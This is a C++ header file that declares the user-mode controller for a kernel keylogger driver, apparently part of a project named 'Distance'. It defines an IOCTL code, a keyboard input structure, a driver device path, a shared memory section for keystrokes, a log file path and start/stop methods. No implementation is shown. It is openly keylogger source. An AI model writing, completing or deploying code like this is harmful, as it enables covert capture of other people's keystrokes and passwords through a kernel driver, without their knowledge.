#ifndef _DISTANCE_KEYLOGGER_CONTROL_HPP_
#define _DISTANCE_KEYLOGGER_CONTROL_HPP_

#include <string>
#include <memory>
#include <thread>
#include <mutex>
#include <atomic>
#include <fstream>
// #include <WinIoCtl.h>
// #include <winnt.h>


#include "StartWinDriver.hpp"
#include "NativeAPI.hpp"
#include "ScanCodes.hpp"


#define IOCTL_DISTANCE_KEYLOGGER \
    CTL_CODE(0x8000u, 0x800u, METHOD_BUFFERED, FILE_WRITE_ACCESS)


namespace Distance
{

    inline const char* g_KeyloggerPathToLogFile = "logs\\keylog.log";

    typedef struct _KEYBOARD_INPUT_DATA {
        USHORT UnitId;
        USHORT MakeCode;
        USHORT Flags;
        USHORT Reserved;
        ULONG  ExtraInformation;
    } KEYBOARD_INPUT_DATA, * PKEYBOARD_INPUT_DATA;


    class KeyloggerControl;


    namespace keylogger_utils
    {
        // WARNING: Function belong other thread. 
        void KeyloggerRoutine(KeyloggerControl* controller);
    }


    class KeyloggerControl
    {
    public:
        KeyloggerControl();
        ~KeyloggerControl();

        void start();
        void stop();

        friend void keylogger_utils::KeyloggerRoutine(KeyloggerControl* controller);

        KeyloggerControl(const KeyloggerControl&) = delete;
        KeyloggerControl& operator = (const KeyloggerControl&) = delete;

        KeyloggerControl(KeyloggerControl&&) = delete;
        KeyloggerControl& operator = (KeyloggerControl&&) = delete;


    private:
        xstar::StartWinDriver* keylogger_;
        HANDLE Device_;
        HANDLE Event_;

        HKEY KeyToLocales_;

        HANDLE SectionHandle_;
        PVOID sectionBaseAddress_;
        LARGE_INTEGER sectionSize_;
        SIZE_T sectionViewSize_;


        std::atomic<bool> isWork_;
        std::mutex mutex_;

        HANDLE logfile_;

        const wchar_t* driverName_ = L"Keylogger";
        const wchar_t* driverPath_ = L"\\\\.\\DistanceKeylogger";
        UNICODE_STRING sectionName_ =
            RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\DistanceKeyloggerSharedSection");

        enum
        {
            OffKeylogger = 0x58,
            QuantitySymbols = 100
        };
    };

} // Distance
#endif // _DISTANCE_KEYLOGGER_CONTROL_HPP_